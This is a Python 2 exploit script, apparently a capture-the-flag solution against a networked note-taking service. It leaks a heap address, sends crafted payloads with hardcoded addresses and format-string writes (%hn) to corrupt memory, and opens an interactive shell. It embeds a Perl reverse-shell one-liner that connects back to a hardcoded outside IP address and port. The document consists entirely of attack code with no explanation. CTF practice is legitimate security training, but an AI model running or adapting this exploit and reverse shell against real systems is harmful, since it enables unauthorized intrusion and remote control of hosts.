import socket
import struct
import telnetlib
import hexdump

def recvu(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		if not tmp: break
		r += tmp
	return r

s = socket.create_connection(['0',8282])
#s = socket.create_connection(['alegria.asis-ctf.ir',8282])
raw_input()
recvu(s,'>')
s.send('2\n')
recvu(s,'ID')
s.send('12\n')
recvu(s,'PW')
s.send('12\n')
recvu(s,'>')
s.send('1\n')
recvu(s,'Title length(max: 64):')
s.send('50\n')
recvu(s,'Content length(max: 1024):')
s.send('50\n')
#s.send('220\n')
recvu(s,'Title:')
s.send('/bin/sh;aaaaaaa%x%x\n')
recvu(s,'Content')
sc = "perl -e \'use Socket;$i=\"119.204.142.101\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'"
s.send('aaaaaaaaaaaa\n')
recvu(s,'>')
s.send('4\n')
recvu(s,'>')
s.send('2\n')
recvu(s,'ID')
s.send('12\n')
recvu(s,'PW')
s.send('12\n')
recvu(s,'>')
s.send('2\n')
heap = int(recvu(s,'Content')[0x3d:0x3d+7],16)+0xa68-0x638
heap2 = heap-0x558
heap3 = heap-0x5e8
heap4 = heap+0xed0
print hex(heap)
rop = ""
rop += struct.pack('<I',0x80489F8)
rop += "AAAA"
rop += struct.pack('<I',heap)
dat = ""
dat += "AAAA"*6
#dat += struct.pack('<I',0x804A578)
#dat += struct.pack('<I',0x804a578)*(6)
#dat += "AAAA"*((104-len(dat))/4)
dat += "AAAA"*1
dat += struct.pack('<I',heap2+0x1a)
dat += struct.pack('<I',0x804a578)
dat += "AAAA"
dat += "AAAA"
dat += struct.pack('<I',0x3)
dat += struct.pack('<I',0x804a578)*((104-len(dat))/4)
dat += struct.pack('<I',heap+0x10+0x4)
dat += struct.pack('<I',0x804A339)
dat += sc
s.send('1\n')
recvu(s,'Title length(max: 64):')
s.send('1000\n')
recvu(s,'Content length(max: 1024):')
s.send('1000\n')
recvu(s,'Title:')
s.send(dat+'\n')
recvu(s,'Content')
s.send(dat+'\n')
recvu(s,'>')
s.send('3\n')
recvu(s,'>')
s.send('1\n')
recvu(s,'Title length(max: 64):')
s.send('3000\n')
recvu(s,'Content length(max: 1024):')
s.send('3000\n')
recvu(s,'Title:')
dat1 = ""
dat1 += "%2052c"
dat1 += "%3$hn"
dat1 += "%33268c"
dat1 += "%4$hn"
dat1 += "a"*(0x68-len(dat1))
dat1 += "AAAA"
dat1 += struct.pack('<I',0x80489F8)
dat1 += "AAAA"
dat1 += struct.pack('<I',heap4)

dat2 = ""
dat2 += struct.pack('<I',heap2+2) 
dat2 += struct.pack('<I',heap2)
s.send(dat1+'\n')
recvu(s,'Content')
s.send(dat2+'\n')
print "***** interact *****"
t = telnetlib.Telnet()
t.sock = s
t.interact()
